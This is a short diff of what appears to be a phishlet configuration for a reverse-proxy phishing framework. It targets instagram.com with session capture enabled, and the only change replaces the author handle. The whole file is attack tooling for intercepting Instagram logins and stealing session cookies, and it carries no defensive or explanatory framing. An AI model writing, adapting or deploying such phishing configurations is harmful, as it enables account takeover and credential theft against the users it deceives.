@@ -1,4 +1,4 @@
-author: '@prrrrinncee'
+author: '@_xx__hrzbrz.officiel__xx_'
 min_ver: '2.3.0'
 proxy_hosts:
   - {phish_sub: 'www', orig_sub: 'www', domain: 'instagram.com', session: true, is_landing: true}
